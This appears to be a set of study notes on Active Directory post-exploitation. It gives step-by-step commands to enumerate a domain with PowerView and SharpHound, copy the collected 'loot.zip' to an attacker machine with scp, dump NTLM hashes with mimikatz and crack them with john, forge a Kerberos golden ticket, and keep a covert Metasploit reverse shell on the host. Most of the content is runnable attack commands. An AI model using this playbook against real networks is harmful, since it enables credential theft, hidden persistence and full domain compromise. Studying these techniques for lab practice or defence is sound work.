# Post Exploitation Basics

Current situation: Here we already into the system with bunch of scripts and tools.

Aim: Enumerate the AD and get the domain, users, group info and much; and also make reverse shell for stable connection without system user known.

## Tools and Scripts Requirement and infomation

1. PowerView.ps1

    - Enumerate the system and get the general infomation about AD

2. mimikatz

3. bloudhound

    - Grabe the AD information and make json file for after watch use with Graph UI

4. Metasploit Frame work

    - make revershell and get stable connection between without user known

## Different Methods of On System Enumeration

1. By using PowerView (Script). this method works when you are present on the live system and you able to upload script and run it. if the system goes down or off then nothing is work.

2. By using Bloodhound (Software/tool). make the zip file of whole AD system in JSON format files and save is it in defferent/own system. in this case if the system gose down the attacker easly analysis the AD by just using blood hound.

3. By using Server Manager (Windows by default AD handling Software)

## Basic Step

- If you are using CMD then follow this command:

`powershell -ep bypass`

- this command bypass execution policy of the powershell and allow you to easly run the scripts. 

## Enumerating Method 1 using PowerService Script

- Now run the script which already present in Downloads directory.

`.\PowerView.ps1`

- After the script runs, now we can use function of this like; `Get-NetUser`, `Get-NetGroup`, `Invoke-ShareFinder` and much more

Eg.:

`Get-NetUser | select cn`

`Get-NetGroup -GroupName *admin*`

`Invoke-ShareFinder`

`Get-FullComputer -fulldata | select operatingsystem`

## Enumerating Method 2 using Bloodhound

- This method we can call post enumeration.

- Bloodhound is a graphical interface that allows you to visually map out the network.

- This tool along with SharpHound which similar to PowerView takes the user, groups, trusts etc. of the network and collects them into .json files to be used inside of Bloodhound.

### Part 1 (At Windows AD target system):

- run the **SharpHound.ps1** scripts which is already present in Download folder and generate zip file, Follow the command.

`.\SharpHound.ps1`

`Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip`

- After the genrate the file, now transfer into own kali/parrot system, by using ssh protocol

`scp loot.zip kaliuser@10.10.10.10:/home/kaliuser/Desktop/loot.zip`

### Part 2 (At Kali attacker System):

- Now start bloodhound tool on terminal

`sudo bloodhound`

- Default Username/Password: neo4j/neo4j

**Note: If the bloodhound can't find the database then follow this command: `sudo neo4j start`. it will start the database. now goto the browser and open localhost page with port which is where you get last command you wrote. Now change/create the password.**

- now upload/darg and drop the zip file onto the bloodhound window.

- Now open query window.

- press the query which we want to execute.

## Enumeration Method 3 using Server Manager

- Simply open **Server Manager** Software in live windows system and see the avalable content.

Eg.:

- Tools > AD Users and Computers

- Tools > AD Sites and Services

## Dumping Hashes

- Mimikatz is a very popular and powerful post-exploitation tool mainly used for dumping user credentials inside of a active directory network.

- now run the `mimikatz.exe` using CMD and follow the bellow command:

`privilege::debug`

- ensure that the output is "Privilege '20' ok" - This ensures that you're running mimikatz as an administrator; if you don't run mimikatz as an administrator, mimikatz will not run properly

- Now dump hashes.

`lsadump::lsa /patch`

- it will give us all users NTLM password hashes.

- crack those hashes using john repper

`john hash.txt --format=NT --wordlist=rockyou.txt`

## Golden Ticket Attack

- We will first dump the hash and sid of the krbtgt user then create a golden ticket and use that golden ticket to open up a new command prompt allowing us to access any machine on the network.

- If your mimikatz is not already running then follow this 2 command:

`mimikatz.exe`

`privilege::debug`

- ensure that the output is "Privilege '20' ok" - This ensures that you're running mimikatz as an administrator; if you don't run mimikatz as an administrator, mimikatz will not run properly

- Now dumps the hash and security identifier of the Kerberos Ticket Granting Ticket account allowing you to create a golden ticket

`lsadump::lsa /inject /name:krbtgt`

- after the run this command store some info and we will use in next command.

`kerberos::golden /user:[Username] /domain:[domain name] /sid:[SID. start with like Eg.: S-1-5-21-] /krbtgt:[NTLM value] /id:[User ID]`

- And use the Golden Ticket and login to the others user accounts.

## Maintaining Access

- Generate the payload using `msfvenom` and pass it to the target machine.

- before the the payload run into the target machine, we need to setup lisiner

- Open `msfconsole` and use `exploit/multi/handler` and set LHOST, LPORT and run it

- Now run the payload at target machine and we will get shell in attacker system.
